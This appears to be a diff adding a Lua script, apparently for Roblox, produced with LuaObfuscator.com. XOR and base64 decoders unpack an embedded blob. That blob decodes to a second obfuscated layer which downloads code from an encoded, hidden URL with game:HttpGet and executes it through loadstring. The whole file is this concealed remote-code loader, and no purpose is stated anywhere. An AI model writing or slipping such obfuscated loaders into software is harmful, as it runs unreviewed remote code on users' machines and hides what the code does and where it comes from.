@@ -1,0 +1,88 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+
+]]--
+
+local v0 = string.char;
+local v1 = string.byte;
+local v2 = string.sub;
+local v3 = bit32 or bit;
+local v4 = v3.bxor;
+local v5 = table.concat;
+local v6 = table.insert;
+local function v7(v12, v13)
+	local v14 = {};
+	for v22 = 1, #v12 do
+		v6(v14, v0(v4(v1(v2(v12, v22, v22 + 1)), v1(v2(v13, 1 + (v22 % #v13), 1 + (v22 % #v13) + 1))) % 256));
+	end
+	return v5(v14);
+end
+local v8 = v7("\240\225\248\1\195\157\224\54\248\233\240\9\203\149\232\46\224\241\232\17\211\141\240\38\232\249\218\39\229\191\194\24\214\203\210\47\237\183\202\16\222\211\202\55\245\175\210\8\198\219\194\63\182\234\149\77\133\150\141\114\190\226\140\81", "\126\177\163\187\69\134\219\167");
+local v9 = {};
+for v15 = 902 - (21 + 880), #v8 do
+	v9[v8:sub(v15, v15)] = v15 - (1 + 0);
+end
+local function v10(v17)
+	local v18 = 957 - (892 + 65);
+	local v19;
+	local v20;
+	local v21;
+	while true do
+		local v23 = 0 - 0;
+		while true do
+			if (v23 == 0) then
+				if (v18 == (1 - 0)) then
+					local v24 = 0 - 0;
+					while true do
+						if (v24 == (351 - (87 + 263))) then
+							v18 = 2;
+							break;
+						end
+						if (v24 == (180 - (67 + 113))) then
+							v20 = 1 + 0;
+							while v20 <= #v17 do
+								local v26 = v9[v17:sub(v20, v20)];
+								local v27 = v9[v17:sub(v20 + (2 - 1), v20 + 1 + 0)];
+								local v28 = v9[v17:sub(v20 + (7 - 5), v20 + (954 - (802 + 150)))];
+								local v29 = v9[v17:sub(v20 + (7 - 4), v20 + (5 - 2))];
+								local v30 = (v26 * (190812 + 71332)) + (v27 * (5093 - (915 + 82))) + ((v28 or 0) * (181 - 117)) + (v29 or (0 + 0));
+								v19[#v19 + (1 - 0)] = string.char(math.floor(v30 / (66723 - (1069 + 118))) % (580 - 324), math.floor(v30 / (559 - 303)) % (45 + 211), v30 % (454 - 198));
+								v20 = v20 + 4;
+							end
+							v24 = 1;
+						end
+					end
+				end
+				if (v18 == 3) then
+					return table.concat(v19);
+				end
+				v23 = 1 + 0;
+			end
+			if ((792 - (368 + 423)) == v23) then
+				if (v18 == (0 - 0)) then
+					v17 = v17:gsub(v7("\24\243\111\210\185\104\136\101\128\161\30", "\156\67\173\74\165"), "");
+					v19 = {};
+					v18 = 1;
+				end
+				if (v18 == (20 - (10 + 8))) then
+					v21 = select(7 - 5, v17:gsub("=", "="));
+					if (v21 == (444 - (416 + 26))) then
+						v19[#v19] = v19[#v19]:sub(3 - 2, 1 + 0);
+					elseif (v21 == (1 - 0)) then
+						v19[#v19] = v19[#v19]:sub(439 - (145 + 293), 432 - (44 + 386));
+					end
+					v18 = 3;
+				end
+				break;
+			end
+		end
+	end
+end
+local v11 = v10("LS1bWwogLl9fX18gICAgICAgICAgICAgICAgICBfX19fX19fXyBfX18uICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgICAgCiB8ICAgIHwgICAgX18gX19fX19fXyAgIFxfX19fXyAgXFxfIHxfX18vIF9fX19cXyBfXyAgX19fX19fIF9fX18gX19fX18gXy8gIHxfICBfX19fX19fX19fXyAKIHwgICAgfCAgIHwgIHwgIFxfXyAgXCAgIC8gICB8ICAgXHwgX18gXCAgIF9fXCAgfCAgXC8gIF9fXy8vIF9fX1xcX18gIFxcICAgX19cLyAgXyBcXyAgX18gXAogfCAgICB8X19ffCAgfCAgLy8gX18gXF8vICAgIHwgICAgXCBcX1wgXCAgfCB8ICB8ICAvXF9fXyBcXCAgXF9fXyAvIF9fIFx8ICB8ICggIDxfPiApICB8IFwvCiB8X19fX19fXyBcX19fXy8oX19fXyAgL1xfX19fX19fICAvX19fICAvX198IHxfX19fLy9fX19fICA+XF9fXyAgPl9fX18gIC9fX3wgIFxfX19fL3xfX3wgICAKICAgICAgICAgXC8gICAgICAgICAgXC8gICAgICAgICBcLyAgICBcLyAgICAgICAgICAgICAgICBcLyAgICAgXC8gICAgIFwvICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgXF9XZWxjb21lIHRvIEx1YU9iZnVzY2F0b3IuY29tICAgKEFscGhhIDAuMTAuOSkgfiAgTXVjaCBMb3ZlLCBGZXJpYiAKCl1dLS0KCmxvY2FsIHYwID0gc3RyaW5nLmNoYXI7CmxvY2FsIHYxID0gc3RyaW5nLmJ5dGU7CmxvY2FsIHYyID0gc3RyaW5nLnN1YjsKbG9jYWwgdjMgPSBiaXQzMiBvciBiaXQ7CmxvY2FsIHY0ID0gdjMuYnhvcjsKbG9jYWwgdjUgPSB0YWJsZS5jb25jYXQ7CmxvY2FsIHY2ID0gdGFibGUuaW5zZXJ0Owpsb2NhbCBmdW5jdGlvbiB2Nyh2OCwgdjkpCglsb2NhbCB2MTAgPSAwIC0gMDsKCWxvY2FsIHYxMTsKCXdoaWxlIHRydWUgZG8KCQlpZiAodjEwID09ICgxNDIzIC0gKDM3OCArIDEwNDQpKSkgdGhlbgoJCQlyZXR1cm4gdjUodjExKTsKCQllbmQKCQlpZiAodjEwID09ICgwIC0gMCkpIHRoZW4KCQkJdjExID0ge307CgkJCWZvciB2MTIgPSAyIC0gMSwgI3Y4IGRvCgkJCQl2Nih2MTEsIHYwKHY0KHYxKHYyKHY4LCB2MTIsIHYxMiArICg1NjkgLSAoMzY3ICsgMjAxKSkpKSwgdjEodjIodjksICg5MjggLSAoMjE0ICsgNzEzKSkgKyAodjEyICUgI3Y5KSwgMSArIDAgKyAodjEyICUgI3Y5KSArIDEpKSkgJSAoNDEgKyAyMTUpKSk7CgkJCWVuZAoJCQl2MTAgPSA4NzggLSAoMjgyICsgNTk1KTsKCQllbmQKCWVuZAplbmQKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQodjcoIlwyMTdcMjE1XDIwN1w1M1wyNDVcMjI1XDEzNlw4MVwxOTVcMTk0XDIwNFwxMDdcMjI1XDE3OFwyMTFcMjJcMTk2XDE5M1wyMDZcNTRcMjI3XDE2OVwxOTZcMTdcMjIzXDIxNVwyMjJcNDNcMjQyXDI0NVwxOTZcMTdcMjIwXDE0MFwxOTRcNjFcMjI1XDE3OVwxNTBcNzJcMTMyXDE0OVwxNDFcMTE1XDE2OVwxNTdcMjAwXDEyXDIyMFwxOTRcMjE1XDEwNlwyMzVcMTg2XDIwNlwxNlwxNThcMjMwXDIxNFw1M1wyMjdcMTY5XDIwMFwxMlwxNDhcMTQ1XDEzOVwxNFwyNDNcMTgxXDIwNFwxMVwyMjNcMTQ2XDEzN1wxMTgiLCAiXDEyNlwxNzdcMTYzXDE4N1w2OVwxMzRcMjE5XDE2NyIpKSkoKTs=");
+loadstring(v11)();
